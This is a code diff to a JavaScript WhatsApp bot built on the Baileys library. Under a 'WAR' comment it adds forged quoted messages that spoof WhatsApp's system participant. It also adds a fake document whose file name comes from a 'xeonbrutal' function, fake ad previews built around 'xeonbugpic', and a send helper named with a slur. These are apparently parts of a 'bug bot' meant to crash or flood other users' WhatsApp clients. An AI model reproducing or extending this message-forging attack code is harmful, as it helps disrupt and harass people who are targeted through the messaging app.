@@ -1,4 +1,4 @@
-
+process.on('uncaughtException', console.error)
 require('./settings')
 const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
 const fs = require('fs')
@@ -300,6 +300,52 @@ if (!('templateVideo' in setting)) setting.templateVideo = false
         } catch (err) {
             console.error(err)
         }
+// WAR
+const doc = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
+},
+"message": {
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
+"mimetype": "application/octet-stream",
+"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
+"fileLength": "64455",
+"pageCount": 1,
+"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
+"fileName": `${global.OwnerName}â˜£ï¸${xeonbrutal(prefix)}`,
+"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
+}}
+}
+
+const xezy = { 
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
+},
+"contextInfo": {
+"stanzaId": "3EB0382EDBB2",
+"externalAdReply": {
+"previewType": "PHOTO",
+"showAdAttribution": true,
+"sourceUrl": websitex,
+"thumbnailUrl": 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
+"thumbnail": xeonbugpic,
+}}}
+const bhosdike = (teks) => {
+ Miku.sendMessage(m.chat, { image: xeonbugpic, caption: wm, contextInfo:{"externalAdReply": {"title": BotName,"body": global.OwnerName,
+previewType: "PHOTO",
+showAdAttribution: true,
+sourceUrl: websitex,
+thumbnailUrl: 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
+thumbnail: xeonbugpic,
+}
+}}, { quoted:xezy})
+}
+
+
+
 	
 	// FAKE TEXT IMG
 const textImg = (teks) => {
